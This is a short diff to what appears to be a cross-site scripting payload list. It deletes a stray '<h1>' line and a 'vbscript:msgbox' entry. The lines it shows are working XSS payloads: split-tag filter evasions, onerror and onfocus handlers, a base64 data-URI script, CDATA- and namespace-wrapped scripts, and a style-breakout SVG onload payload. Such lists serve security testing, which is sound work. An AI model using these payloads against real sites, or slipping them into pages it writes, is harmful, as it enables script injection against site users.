@@ -1,4 +1,3 @@
-<h1>
 <script>alert(1)</script>
 <scr<script>ipt>alert('XSS')</scr<script>ipt>
 <script>alert(String.fromCharCode(88,83,83))</script>
@@ -41,7 +40,6 @@
 <img src=/ onerror=alert(2)>
 <input autofocus onfocus=alert(1)>
 <script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
-vbscript:msgbox("XSS")
 <name><value><![CDATA[<script>confirm(document.domain)</script>]]></value></name>
 <something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
 <style>div{background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>");background-color: #cccccc;}</style>
